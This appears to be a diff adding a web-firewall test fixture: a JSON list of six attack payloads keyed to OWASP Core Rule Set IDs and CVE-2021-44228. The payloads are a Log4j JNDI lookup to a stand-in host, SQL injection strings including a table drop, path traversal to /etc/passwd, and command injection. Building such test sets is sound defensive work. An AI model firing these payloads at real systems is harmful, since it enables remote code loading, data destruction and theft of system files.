@@ -1,0 +1,32 @@
+[
+    {
+        "name": "Log4j JNDI injection",
+        "ref": "CVE-2021-44228",
+        "payload": "${jndi:ldap://example.com/a}"
+    },
+    {
+        "name": "SQL injection (classic)",
+        "ref": "CRS 942100",
+        "payload": "' OR '1'='1"
+    },
+    {
+        "name": "SQL injection (comment terminator)",
+        "ref": "CRS 942110",
+        "payload": "1; DROP TABLE users--"
+    },
+    {
+        "name": "Path traversal",
+        "ref": "CRS 930110",
+        "payload": "../../../../etc/passwd"
+    },
+    {
+        "name": "Path traversal (URL-encoded)",
+        "ref": "CRS 930120",
+        "payload": "..%2F..%2F..%2Fetc%2Fpasswd"
+    },
+    {
+        "name": "Command injection",
+        "ref": "CRS 932100",
+        "payload": "; cat /etc/passwd"
+    }
+]
